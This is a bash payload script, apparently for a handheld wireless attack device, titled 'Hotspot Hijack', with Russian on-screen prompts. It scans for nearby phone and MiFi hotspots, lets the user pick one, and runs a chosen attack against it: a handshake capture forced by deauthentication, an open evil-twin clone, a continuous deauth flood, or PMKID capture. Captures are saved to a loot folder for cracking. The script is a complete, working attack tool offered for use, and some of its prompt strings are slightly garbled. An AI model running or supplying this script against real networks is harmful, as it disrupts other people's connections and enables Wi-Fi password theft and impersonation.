#!/bin/bash
# Title: Hotspot Hijack
# Author: bad-antics
# Description: Target mobile hotspots specifically
# Category: nullsec/attack

# Autodetect the right wireless interface (exports $IFACE).
# Falls back to showing the pager error dialog if nothing is plugged in.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

LOOT_DIR="/mmc/nullsec/hotspots"
mkdir -p "$LOOT_DIR"

PROMPT "ПОХИЩЕНИЕ ХОТСПОТОВ

Относитесь к мобильным hotspotам
(телефоны, планшеты, MiFi).

У них часто слабые
пароли и тысячи
подключённых девайсов.

Нажмите OK для конфигурирования."

SPINNER_START "Сканирование hotspotов..."
timeout 15 airodump-ng $IFACE --write-interval 1 -w /tmp/hotscan --output-format csv 2>/dev/null
SPINNER_STOP

# Find likely hotspots (common naming patterns)
grep -iE "iPhone|Android|Galaxy|Pixel|OnePlus|Hotspot|Mobile|MiFi|Jetpack|iPhone|'s " /tmp/hotscan*.csv 2>/dev/null > /tmp/hotspots.txt

HOTSPOT_COUNT=$(wc -l < /tmp/hotspots.txt 2>/dev/null || echo 0)

if [ "$HOTSPOT_COUNT" -eq 0 ]; then
    PROMPT "ХОТСПОТЫ НЕ НАЙДЕНЫ

Mobile hotspotы близко не обнаружены.

Попытайтесь позже или
сканируйте дольше.

Нажмите OK для выхода."
    exit 0
fi

PROMPT "НАЙДЕНО $HOTSPOT_COUNT HOTSPOTОВ

Выберите цель по номеру
на следующем экране."

TARGET_NUM=$(NUMBER_PICKER "Цель # (1-$HOTSPOT_COUNT):" 1)

TARGET_LINE=$(sed -n "${TARGET_NUM}p" /tmp/hotspots.txt)
BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
CHANNEL=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')

PROMPT "ЦЕЛЬ ВЫБРАНА

SSID: $SSID
BSSID: $BSSID
Канал: $CHANNEL

Выберите атаку."

PROMPT "ВЫБОР АТАКИ:

1. Захват handshake
2. Evil twin-клон
3. Нарушение deauth
4. Перехват PMKID

Введите номер."

ATTACK=$(NUMBER_PICKER "Атака (1-4):" 1)

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ АТАКУ?

Цель: $SSID
Атака: $ATTACK

Нажмите OK для начала.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

iwconfig $IFACE channel $CHANNEL
CAP_FILE="$LOOT_DIR/hotspot_${SSID}_$(date +%Y%m%d_%H%M)"

case $ATTACK in
    1) # Handshake
        LOG "Перехват handshake..."
        airodump-ng $IFACE --bssid "$BSSID" -c $CHANNEL -w "$CAP_FILE" &
        CAP_PID=$!
        sleep 3
        
        for i in 1 2 3; do
            aireplay-ng -0 5 -a "$BSSID" $IFACE 2>/dev/null
            sleep 8
            if aircrack-ng "${CAP_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
                break
            fi
        done
        
        kill $CAP_PID 2>/dev/null
        
        if aircrack-ng "${CAP_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
            PROMPT "ХЕНДШЕЙК ПЕРЕХВАЧЕН!

SSID: $SSID
Файл: ${CAP_FILE}.cap

Готов к взлому."
        else
            PROMPT "ХЕНДШЕйК НЕ ПЕРЕХВАЧЕН

Не удалось перехватить.
Попытайтесь еще."
        fi
        ;;
    2) # Evil twin
        LOG "Начинаю evil twin..."
        cat > /tmp/twin.conf << EOF
interface=$IFACE
ssid=$SSID
channel=$CHANNEL
hw_mode=g
auth_algs=1
wpa=0
EOF
        hostapd /tmp/twin.conf &
        aireplay-ng -0 0 -a "$BSSID" $IFACE &
        
        PROMPT "Отключающий твин АКТИВНОВ

Клон: $SSID
Нажмите OK для остановки."
        
        killall hostapd aireplay-ng 2>/dev/null
        ;;
    3) # Deauth
        LOG "Отключаю hotspot..."
        aireplay-ng -0 0 -a "$BSSID" $IFACE &
        
        PROMPT "ОТКЛЮЧЕНИЕ АКТИВНО

Цель: $SSID
Нажмите OK для остановки."
        
        killall aireplay-ng 2>/dev/null
        ;;
    4) # PMKID
        LOG "Перехват PMKID..."
        timeout 30 hcxdumptool -i $IFACE -o "$CAP_FILE.pcapng" --filterlist_ap="$BSSID" --filtermode=2 2>/dev/null
        
        if [ -f "$CAP_FILE.pcapng" ]; then
            hcxpcapngtool -o "$CAP_FILE.hash" "$CAP_FILE.pcapng" 2>/dev/null
            PROMPT "PMKID перехвачен!

Файл: $CAP_FILE.hash"
        else
            PROMPT "Нет PMKID

Цель может не поддерживать."
        fi
        ;;
esac

PROMPT "АТАКА ЗАВЕрШЕНА

Цель: $SSID
Нажмите OK для выхода."
